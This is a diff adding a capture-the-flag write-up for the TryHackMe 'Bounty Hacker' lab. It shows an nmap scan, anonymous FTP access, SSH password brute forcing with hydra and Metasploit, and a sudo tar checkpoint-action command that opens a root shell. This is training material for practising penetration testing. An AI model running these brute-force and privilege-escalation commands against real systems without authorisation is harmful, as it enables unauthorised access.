@@ -1,0 +1,138 @@
+
+# TryHackMe: Bounty Hacker
+
+
+
+## Objective
+
+Gain initial access to a vulnerable target via exposed services and escalate privileges to retrieve user and root flags.
+
+---
+
+## 1. Reconnaissance
+
+### Nmap Scan
+
+nmap -sC -sV -oN bounty-nmap.txt <target-ip>
+
+
+**Findings:**
+
+* **Port 21 (FTP):** vsftpd 3.0.3 – Anonymous login allowed
+* **Port 22 (SSH):** OpenSSH 7.9p1
+* **Port 80 (HTTP):** Apache httpd 2.4.38
+
+---
+
+## 2. Enumeration
+
+### FTP
+
+Anonymous login granted access. Upon login:
+
+```bash
+ftp <target-ip>
+```
+
+**Downloaded files:**
+
+* `locks.txt` — Appears to be a list of potential passwords.
+
+### Web (Port 80)
+
+Accessing via browser showed a basic landing page. No interactive elements or login functionality noted. Directory brute forcing yielded no significant results.
+
+---
+
+## 3. Brute Forcing SSH Login
+
+Using the common **Cewl-generated usernames** or known user `lin`, and the password list from FTP (`locks.txt`), attempted SSH brute force:
+
+
+hydra -l lin -P locks.txt ssh://<target-ip>
+
+**Credentials found:**
+
+* **Username:** lin
+* **Password:** \<password\_from\_locks.txt>
+
+SSH access granted.
+
+
+### 🔐 Alternative Brute Force: Metasploit (`ssh_login`)
+
+Instead of using Hydra, the SSH credentials can also be discovered using **Metasploit Framework**:
+
+1. Start Metasploit:
+
+msfconsole
+
+
+2. Use the SSH login module:
+
+use auxiliary/scanner/ssh/ssh_login
+
+
+3. Set the required options:
+
+set RHOSTS <target-ip>
+set USERNAME lin
+set PASS_FILE /path/to/locks.txt
+set VERBOSE true
+run
+
+
+4. Metasploit will attempt to log in using each password in `locks.txt`. Upon success, it provides valid credentials.
+
+✅ **Credentials Found:**
+
+* **Username:** lin
+* **Password:** (retrieved from `locks.txt`)
+
+5. SSH into the machine:
+ssh lin@<target-ip>
+
+
+## 4. User Flag
+
+After SSH login:
+
+ssh lin@<target-ip>
+
+
+Located the `user.txt` flag in `/home/lin`:
+
+cat user.txt
+
+
+✅ **User flag captured.**
+
+
+
+## 5. Privilege Escalation
+
+### Checking Sudo Permissions
+
+
+sudo -l
+
+**Output:**
+
+* User `lin` can execute `/bin/tar` as root without password.
+
+### Tar GTFOBin Exploit
+
+Used the following command from GTFOBins to escalate:
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+Root shell obtained.
+
+## 6. Root Flag
+
+Located in `/root` directory:
+
+cat /root/root.txt
+
+
+✅ **Root flag captured.**
